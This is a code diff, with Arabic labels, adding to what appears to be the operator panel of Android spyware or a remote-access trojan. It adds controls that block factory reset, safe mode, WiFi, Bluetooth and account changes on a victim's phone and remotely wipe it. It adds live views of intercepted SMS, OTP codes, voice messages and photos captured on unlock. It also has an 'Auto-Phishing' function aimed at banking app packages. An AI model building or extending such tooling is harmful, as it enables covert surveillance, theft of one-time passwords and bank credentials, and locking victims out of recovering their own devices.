@@ -382,4 +382,186 @@
                     </div>
 
                     <!-- 🔵 منع Bluetooth -->
-                    <div style="background:#0a0a0a;border:2
+                    <div style="background:#0a0a0a;border:2px solid #3f51b5;border-radius:12px;padding:18px;">
+                        <h4 style="color:#3f51b5;margin-bottom:10px;">🔵 منع Bluetooth</h4>
+                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يقطع البلوتوث</p>
+                        <div style="display:flex;gap:8px;">
+                            <button onclick="advancedAction('disable_bluetooth')" style="flex:1;background:#3f51b5;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🚫 منع</button>
+                            <button onclick="advancedAction('enable_bluetooth')" style="flex:1;background:#222;color:#3f51b5;border:1px solid #3f51b5;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">✅ سماح</button>
+                        </div>
+                    </div>
+
+                    <!-- 📵 منع WiFi -->
+                    <div style="background:#0a0a0a;border:2px solid #ff9800;border-radius:12px;padding:18px;">
+                        <h4 style="color:#ff9800;margin-bottom:10px;">📵 منع WiFi</h4>
+                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يمنع تفعيل WiFi</p>
+                        <div style="display:flex;gap:8px;">
+                            <button onclick="advancedAction('disable_wifi')" style="flex:1;background:#ff9800;color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🚫 منع</button>
+                            <button onclick="advancedAction('enable_wifi')" style="flex:1;background:#222;color:#ff9800;border:1px solid #ff9800;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">✅ سماح</button>
+                        </div>
+                    </div>
+
+                    <!-- 🚫 منع الحسابات -->
+                    <div style="background:#0a0a0a;border:2px solid #795548;border-radius:12px;padding:18px;">
+                        <h4 style="color:#795548;margin-bottom:10px;">🚫 منع الحسابات</h4>
+                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يمنع إضافة حسابات</p>
+                        <div style="display:flex;gap:8px;">
+                            <button onclick="advancedAction('disable_accounts')" style="flex:1;background:#795548;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🚫 منع</button>
+                            <button onclick="advancedAction('enable_accounts')" style="flex:1;background:#222;color:#795548;border:1px solid #795548;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">✅ سماح</button>
+                        </div>
+                    </div>
+
+                    <!-- 🔒 منع Factory Reset -->
+                    <div style="background:#0a0a0a;border:2px solid #f44336;border-radius:12px;padding:18px;">
+                        <h4 style="color:#f44336;margin-bottom:10px;">🔒 منع Factory Reset</h4>
+                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يمنع إعادة الضبط</p>
+                        <div style="display:flex;gap:8px;">
+                            <button onclick="advancedAction('disable_factory_reset')" style="flex:1;background:#f44336;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🚫 منع</button>
+                            <button onclick="advancedAction('enable_factory_reset')" style="flex:1;background:#222;color:#f44336;border:1px solid #f44336;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">✅ سماح</button>
+                        </div>
+                    </div>
+
+                    <!-- 🔕 منع تعديل الإعدادات -->
+                    <div style="background:#0a0a0a;border:2px solid #009688;border-radius:12px;padding:18px;">
+                        <h4 style="color:#009688;margin-bottom:10px;">🔕 منع تعديل الإعدادات</h4>
+                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يمنع تغيير WiFi/etc</p>
+                        <div style="display:flex;gap:8px;">
+                            <button onclick="advancedAction('disable_config')" style="flex:1;background:#009688;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🚫 منع</button>
+                            <button onclick="advancedAction('enable_config')" style="flex:1;background:#222;color:#009688;border:1px solid #009688;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">✅ سماح</button>
+                        </div>
+                    </div>
+
+                    <!-- 🚫 منع Safe Mode -->
+                    <div style="background:#0a0a0a;border:2px solid #673ab7;border-radius:12px;padding:18px;">
+                        <h4 style="color:#673ab7;margin-bottom:10px;">🚫 منع Safe Mode</h4>
+                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يمنع الوضع الآمن</p>
+                        <div style="display:flex;gap:8px;">
+                            <button onclick="advancedAction('disable_safe_mode')" style="flex:1;background:#673ab7;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🚫 منع</button>
+                            <button onclick="advancedAction('enable_safe_mode')" style="flex:1;background:#222;color:#673ab7;border:1px solid #673ab7;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">✅ سماح</button>
+                        </div>
+                    </div>
+
+                    <!-- ⏱️ قفل تلقائي -->
+                    <div style="background:#0a0a0a;border:2px solid #ffc107;border-radius:12px;padding:18px;">
+                        <h4 style="color:#ffc107;margin-bottom:10px;">⏱️ قفل تلقائي</h4>
+                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يقفل بعد X ثانية</p>
+                        <input id="lockTimeoutInput" type="number" placeholder="ثواني (30)" min="5" max="600" style="width:100%;padding:10px;background:#111;border:1px solid #ffc107;border-radius:6px;color:#fff;font-size:13px;margin-bottom:10px;text-align:center;font-family:inherit;">
+                        <button onclick="setLockTimeout()" style="width:100%;background:#ffc107;color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">⏱️ تطبيق</button>
+                    </div>
+
+                    <!-- 💥 مسح كل شي -->
+                    <div style="background:#0a0a0a;border:2px solid #d32f2f;border-radius:12px;padding:18px;">
+                        <h4 style="color:#d32f2f;margin-bottom:10px;">💥 مسح كل شي</h4>
+                        <p style="color:#ff6b6b;font-size:11px;margin-bottom:12px;">⚠️ لا رجعة</p>
+                        <button onclick="wipeConfirm()" style="width:100%;background:linear-gradient(135deg,#d32f2f,#8b0000);color:#fff;border:none;padding:14px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;box-shadow:0 0 20px rgba(211,47,47,0.5);">💥 مسح الجهاز</button>
+                    </div>
+
+                </div>
+
+                <!-- 📊 سجل الصور التلقائية -->
+                <div style="margin-top:25px;padding:15px;background:#0a0a0a;border:1px solid #FFD700;border-radius:10px;">
+                    <h4 style="color:#FFD700;margin-bottom:12px;">📊 سجل الصور التلقائية</h4>
+                    <button onclick="loadUnlockPhotos()" style="background:#00ffcc;color:#000;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
+                        🔄 تحديث
+                    </button>
+                    <div id="unlockPhotosList" style="margin-top:15px;display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px;"></div>
+                </div>
+
+                <div style="margin-top:20px;padding:15px;background:#1a0000;border:1px solid #d32f2f;border-radius:10px;">
+                    <p style="color:#ff6b6b;font-size:12px;margin:0;">
+                        ⚠️ <b>تحذير:</b> بعض المميزات تحتاج <b>Device Owner</b> (عبر ADB).
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="liveImagesOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;overflow-y:auto;padding:20px;">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
+            <h2 style="color:#00ffcc;text-shadow:0 0 15px #00ffcc;">📸 الصور الفورية</h2>
+            <div>
+                <button onclick="clearLiveImages()" style="background:#ff3300;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;">🗑️ مسح الكل</button>
+                <button onclick="closeLiveImages()" style="background:#333;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:10px;">✖ إغلاق</button>
+            </div>
+        </div>
+        <div id="liveImagesGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:15px;">
+            <p style="color:#666;grid-column:1/-1;text-align:center;padding:50px;">في انتظار صور جديدة...</p>
+        </div>
+    </div>
+
+    <div id="liveMsgsOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;overflow-y:auto;padding:20px;">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
+            <h2 style="color:#ff0066;text-shadow:0 0 15px #ff0066;">💬 الرسائل الفورية</h2>
+            <div>
+                <button onclick="filterLiveMsgs('all')" id="filterAll" style="background:#ff0066;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;">الكل</button>
+                <button onclick="filterLiveMsgs('in')" id="filterIn" style="background:#333;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:5px;">📥</button>
+                <button onclick="filterLiveMsgs('out')" id="filterOut" style="background:#333;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:5px;">📤</button>
+                <button onclick="clearLiveMsgs()" style="background:#ff3300;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:10px;">🗑️ مسح</button>
+                <button onclick="closeLiveMessages()" style="background:#333;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;">✖ إغلاق</button>
+            </div>
+        </div>
+        <div id="liveMsgsList" style="display:flex;flex-direction:column;gap:10px;">
+            <p style="color:#666;text-align:center;padding:50px;">في انتظار رسائل جديدة...</p>
+        </div>
+    </div>
+
+    <div id="liveOtpOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;overflow-y:auto;padding:20px;">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
+            <h2 style="color:#ffcc00;text-shadow:0 0 15px #ffcc00;">🔐 أكواد OTP</h2>
+            <div>
+                <button onclick="clearLiveOtp()" style="background:#ff3300;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;">🗑️ مسح</button>
+                <button onclick="closeLiveOtp()" style="background:#333;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:10px;">✖ إغلاق</button>
+            </div>
+        </div>
+        <div id="liveOtpList" style="display:flex;flex-direction:column;gap:12px;">
+            <p style="color:#666;text-align:center;padding:50px;">لا توجد أكواد OTP بعد</p>
+        </div>
+    </div>
+
+    <div id="liveVoicesOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;overflow-y:auto;padding:20px;">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
+            <h2 style="color:#00ffcc;text-shadow:0 0 15px #00ffcc;">🎤 الرسائل الصوتية</h2>
+            <div>
+                <button onclick="triggerVoiceScan()" style="background:#ffcc00;color:#000;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;margin-left:10px;">🔁 فحص</button>
+                <button onclick="clearLiveVoices()" style="background:#ff3300;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;">🗑️ مسح</button>
+                <button onclick="closeLiveVoices()" style="background:#333;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:10px;">✖ إغلاق</button>
+            </div>
+        </div>
+        <div id="liveVoicesList" style="display:flex;flex-direction:column;gap:12px;">
+            <p style="color:#666;text-align:center;padding:50px;">لا توجد رسائل صوتية بعد</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+    <script>
+    document.addEventListener('DOMContentLoaded', function() { playSound(); });
+    function playSound() { try { const audio = new Audio('v.wav'); audio.volume = 1.0; audio.play(); } catch (e) {} }
+    function reloadMap() {
+        const iframe = document.getElementById('mapFrame');
+        if (iframe) iframe.src = iframe.src;
+    }
+
+    // ═══════════════════════════════════════════════════════
+    // 🆕 دوال جديدة — قسم Admin
+    // ═══════════════════════════════════════════════════════
+
+    // 🎣 Auto-Phishing
+    function startPhishing() {
+        const target = document.getElementById('phishingTarget').value.trim();
+        if (!target) { alert('اكتب اسم الحزمة (مثلاً: com.bank.app)'); return; }
+        if (typeof sendCommand === 'function') {
+            sendCommand('set_phishing_target', { target: target });
+        } else {
+            alert('✅ تم تفعيل الفيشينج على: ' + target);
+        }
+    }
+
+    // 📊 سجل الصور التلقائية
+    function loadUnlockPhotos() {
+        if (typeof sendCommand === 'function') {
+            sendCommand('get_unlock_photos', {});
+        }
+    }
+    </script>
+</body>
+            </html>
